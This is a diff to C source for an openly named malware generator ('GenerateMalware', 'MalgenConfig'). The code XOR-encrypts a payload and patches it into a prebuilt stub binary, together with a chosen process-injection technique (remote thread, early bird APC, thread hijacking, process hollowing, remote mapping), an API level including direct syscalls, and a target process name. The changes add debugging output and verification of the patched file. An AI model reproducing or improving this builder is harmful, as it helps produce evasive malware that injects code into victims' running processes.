@@ -8,10 +8,10 @@
 BYTE GetTechniqueIndex(InjectionTechnique technique) {
     switch (technique) {
     case INJECTION_CREATE_REMOTE_THREAD: return 0;
-    case INJECTION_APC: return 1;
+    case INJECTION_EARLY_BIRD_APC: return 1;
     case INJECTION_THREAD_HIJACKING: return 2;
     case INJECTION_PROCESS_HOLLOWING: return 3;
-    case INJECTION_STOMPING: return 4;
+    case INJECTION_REMOTE_MAPPING: return 4;
     default: return 0;
     }
 }
@@ -59,8 +59,8 @@ BOOL PatchBinary(const MalgenConfig* config, LPVOID payload, SIZE_T payload_size
 
     hStub = CreateFileA(stub_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hStub == INVALID_HANDLE_VALUE) {
-        printf("stub not found: %s\n", stub_path);
-        printf("stubs must be built first\n");
+        printf("cant find stub: %s\n", stub_path);
+        printf("build stubs first\n");
         return FALSE;
     }
 
@@ -72,57 +72,140 @@ BOOL PatchBinary(const MalgenConfig* config, LPVOID payload, SIZE_T payload_size
     }
 
     if (!ReadFile(hStub, stub_data, stub_size, &bytes_read, NULL)) {
-        printf("failed to read stub\n");
+        printf("couldnt read stub\n");
         free(stub_data);
         CloseHandle(hStub);
         return FALSE;
     }
     CloseHandle(hStub);
 
-    for (i = 0; i < stub_size - sizeof(DWORD); i++) {
+    for (i = 0; i < stub_size - sizeof(DWORD) - 12; i++) {
         if (*(DWORD*)(stub_data + i) == marker) {
-            marker_offset = i;
-            found = TRUE;
-            break;
+            BOOL looks_like_struct = TRUE;
+            DWORD j;
+            for (j = sizeof(DWORD); j < sizeof(DWORD) + 12; j++) {
+                if (stub_data[i + j] != 0) {
+                    looks_like_struct = FALSE;
+                    break;
+                }
+            }
+            if (looks_like_struct) {
+                marker_offset = i;
+                found = TRUE;
+                break;
+            }
         }
     }
 
     if (!found) {
-        printf("payload marker not found in stub\n");
+        printf("marker not found in stub\n");
         free(stub_data);
         return FALSE;
     }
 
+    printf("found marker at offset: 0x%X\n", marker_offset);
+    printf("struct offsets: payload_size=0, payload=%zu, xor_key=%zu, technique=%zu, target=%zu\n",
+           sizeof(DWORD),
+           sizeof(DWORD) + MAX_PAYLOAD_SIZE,
+           sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1,
+           sizeof(DWORD) + MAX_PAYLOAD_SIZE + 2);
+
+    printf("\nbefore patching - bytes at marker:\n");
+    printf("  [0-3] payload_size: %02X %02X %02X %02X (0x%08X)\n",
+           stub_data[marker_offset], stub_data[marker_offset+1],
+           stub_data[marker_offset+2], stub_data[marker_offset+3],
+           *(DWORD*)(stub_data + marker_offset));
+    printf("  [%d] xor_key: %02X\n",
+           sizeof(DWORD) + MAX_PAYLOAD_SIZE,
+           stub_data[marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE]);
+    printf("  [%d] technique: %02X\n",
+           sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1,
+           stub_data[marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1]);
+
+    printf("\npatching:\n");
+    printf("  payload_size: %zu bytes (0x%08X)\n", payload_size, (DWORD)payload_size);
+    printf("  xor_key: 0x%02X (encryption: %s)\n",
+           (config->encryption == ENCRYPTION_XOR) ? config->xor_key : 0x00,
+           (config->encryption == ENCRYPTION_NONE) ? "none" : (config->encryption == ENCRYPTION_XOR) ? "xor" : "aes");
+    printf("  technique: %d\n", GetTechniqueIndex(config->injection));
+    printf("  target: %s\n", config->target.process_name);
+
     *(DWORD*)(stub_data + marker_offset) = (DWORD)payload_size;
     memcpy(stub_data + marker_offset + sizeof(DWORD), payload, payload_size);
-    *(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE) = config->xor_key;
+    *(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE) = (config->encryption == ENCRYPTION_XOR) ? config->xor_key : 0x00;
     *(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1) = GetTechniqueIndex(config->injection);
 
     memcpy(stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 2,
            config->target.process_name, strlen(config->target.process_name) + 1);
 
+    printf("\nafter patching:\n");
+    printf("  [0-3] payload_size: %02X %02X %02X %02X (0x%08X = %u)\n",
+           stub_data[marker_offset], stub_data[marker_offset+1],
+           stub_data[marker_offset+2], stub_data[marker_offset+3],
+           *(DWORD*)(stub_data + marker_offset),
+           *(DWORD*)(stub_data + marker_offset));
+    printf("  [4-7] first 4 payload bytes: %02X %02X %02X %02X\n",
+           stub_data[marker_offset+4], stub_data[marker_offset+5],
+           stub_data[marker_offset+6], stub_data[marker_offset+7]);
+    printf("  [%d] xor_key: %02X\n",
+           sizeof(DWORD) + MAX_PAYLOAD_SIZE,
+           stub_data[marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE]);
+    printf("  [%d] technique: %02X\n",
+           sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1,
+           stub_data[marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 1]);
+    printf("  [%d] target (first 12 chars): %.12s\n",
+           sizeof(DWORD) + MAX_PAYLOAD_SIZE + 2,
+           stub_data + marker_offset + sizeof(DWORD) + MAX_PAYLOAD_SIZE + 2);
+
     hOutput = CreateFileA(config->output_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
     if (hOutput == INVALID_HANDLE_VALUE) {
-        printf("failed to create output\n");
+        printf("couldnt create output file\n");
         free(stub_data);
         return FALSE;
     }
 
     if (!WriteFile(hOutput, stub_data, stub_size, &bytes_written, NULL)) {
-        printf("failed to write output\n");
+        printf("couldnt write output\n");
         CloseHandle(hOutput);
         free(stub_data);
         return FALSE;
     }
 
+    printf("wrote %lu bytes\n", bytes_written);
+
+    if (!FlushFileBuffers(hOutput)) {
+        printf("warning: couldnt flush buffers\n");
+    }
+
     CloseHandle(hOutput);
+
+    printf("verifying written file...\n");
+    {
+        HANDLE hVerify;
+        LPBYTE verify_data;
+        DWORD verify_read;
+
+        hVerify = CreateFileA(config->output_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        if (hVerify != INVALID_HANDLE_VALUE) {
+            verify_data = (LPBYTE)malloc(stub_size);
+            if (ReadFile(hVerify, verify_data, stub_size, &verify_read, NULL)) {
+                printf("read back %lu bytes\n", verify_read);
+                printf("  [0-3] at marker offset: %02X %02X %02X %02X (should be 69 00 00 00)\n",
+                       verify_data[marker_offset], verify_data[marker_offset+1],
+                       verify_data[marker_offset+2], verify_data[marker_offset+3]);
+            }
+            free(verify_data);
+            CloseHandle(hVerify);
+        }
+    }
+
     free(stub_data);
 
     return TRUE;
 }
 
 VOID PrintConfigSummary(const MalgenConfig* config) {
-    printf("configuration summary:\n");
+    printf("config:\n");
 
     printf("\tpayload: ");
     switch (config->payload_type) {
@@ -141,17 +224,17 @@ VOID PrintConfigSummary(const MalgenConfig* config) {
     printf("\tinjection: ");
     switch (config->injection) {
     case INJECTION_CREATE_REMOTE_THREAD: printf("CreateRemoteThread\n"); break;
-    case INJECTION_APC: printf("APC injection\n"); break;
+    case INJECTION_EARLY_BIRD_APC: printf("early bird APC\n"); break;
     case INJECTION_THREAD_HIJACKING: printf("thread hijacking\n"); break;
     case INJECTION_PROCESS_HOLLOWING: printf("process hollowing\n"); break;
-    case INJECTION_STOMPING: printf("module stomping\n"); break;
+    case INJECTION_REMOTE_MAPPING: printf("remote mapping\n"); break;
     }
 
-    printf("\tAPI level: ");
+    printf("\tAPI: ");
     switch (config->api_level) {
     case API_WINAPI: printf("WinAPI\n"); break;
-    case API_NTDLL: printf("ntdll\n"); break;
-    case API_SYSCALLS: printf("direct syscalls\n"); break;
+    case API_NTDLL: printf("NTDLL\n"); break;
+    case API_SYSCALLS: printf("syscalls\n"); break;
     }
 
     printf("\ttarget: %s\n", config->target.process_name);
@@ -163,9 +246,9 @@ BOOL GenerateMalware(const MalgenConfig* config) {
 
     PrintConfigSummary(config);
 
-    printf("\nretrieving payload\n");
+    printf("\ngetting payload\n");
     if (!GetPayload(config->payload_type, &payload, &payload_size)) {
-        printf("failed to get payload\n");
+        printf("couldnt get payload\n");
         return FALSE;
     }
 
@@ -173,20 +256,20 @@ BOOL GenerateMalware(const MalgenConfig* config) {
 
     if (config->encryption == ENCRYPTION_XOR) {
         SIZE_T i;
-        printf("encrypting payload with XOR...\n");
+        printf("encrypting with XOR...\n");
         for (i = 0; i < payload_size; i++) {
             ((BYTE*)payload)[i] ^= config->xor_key;
         }
-        printf("payload encrypted\n");
+        printf("encrypted\n");
     }
 
-    printf("patching stub binary\n");
+    printf("patching stub\n");
     if (!PatchBinary(config, payload, payload_size)) {
         free(payload);
         return FALSE;
     }
 
     free(payload);
-    printf("binary generated: %s\n", config->output_path);
+    printf("done: %s\n", config->output_path);
     return TRUE;
 }
